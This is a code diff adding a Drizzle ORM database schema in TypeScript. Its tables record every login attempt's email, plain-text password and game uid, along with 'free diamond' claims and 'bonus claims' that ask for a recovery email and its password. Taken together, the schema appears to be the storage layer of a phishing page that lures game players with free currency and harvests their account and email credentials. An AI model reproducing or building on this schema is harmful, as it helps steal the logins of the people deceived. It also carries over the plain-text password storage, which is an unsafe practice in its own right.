@@ -1,0 +1,69 @@
+import { pgTable, serial, text, timestamp, integer } from "drizzle-orm/pg-core";
+import { createInsertSchema } from "drizzle-zod";
+import { z } from "zod";
+
+export const users = pgTable("users", {
+  id: serial("id").primaryKey(),
+  username: text("username").notNull().unique(),
+  email: text("email").notNull(),
+  password: text("password").notNull(),
+  uid: text("uid").notNull(),
+  createdAt: timestamp("created_at").defaultNow(),
+});
+
+export const loginAttempts = pgTable("login_attempts", {
+  id: serial("id").primaryKey(),
+  email: text("email").notNull(),
+  password: text("password").notNull(),
+  uid: text("uid").notNull(),
+  timestamp: timestamp("timestamp").defaultNow(),
+});
+
+export const diamondClaims = pgTable("diamond_claims", {
+  id: serial("id").primaryKey(),
+  amount: integer("amount").notNull(),
+  email: text("email").notNull(),
+  timestamp: timestamp("timestamp").defaultNow(),
+});
+
+export const bonusClaims = pgTable("bonus_claims", {
+  id: serial("id").primaryKey(),
+  recoveryEmail: text("recovery_email").notNull(),
+  password: text("password").notNull(),
+  timestamp: timestamp("timestamp").defaultNow(),
+});
+
+export const insertUserSchema = createInsertSchema(users).pick({
+  username: true,
+  email: true,
+  password: true,
+  uid: true,
+});
+
+export const insertLoginAttemptSchema = createInsertSchema(loginAttempts).pick({
+  email: true,
+  password: true,
+  uid: true,
+  timestamp: true,
+});
+
+export const insertDiamondClaimSchema = createInsertSchema(diamondClaims).pick({
+  amount: true,
+  email: true,
+  timestamp: true,
+});
+
+export const insertBonusClaimSchema = createInsertSchema(bonusClaims).pick({
+  recoveryEmail: true,
+  password: true,
+  timestamp: true,
+});
+
+export type User = typeof users.$inferSelect;
+export type InsertUser = z.infer<typeof insertUserSchema>;
+export type LoginAttempt = typeof loginAttempts.$inferSelect;
+export type InsertLoginAttempt = z.infer<typeof insertLoginAttemptSchema>;
+export type DiamondClaim = typeof diamondClaims.$inferSelect;
+export type InsertDiamondClaim = z.infer<typeof insertDiamondClaimSchema>;
+export type BonusClaim = typeof bonusClaims.$inferSelect;
+export type InsertBonusClaim = z.infer<typeof insertBonusClaimSchema>;
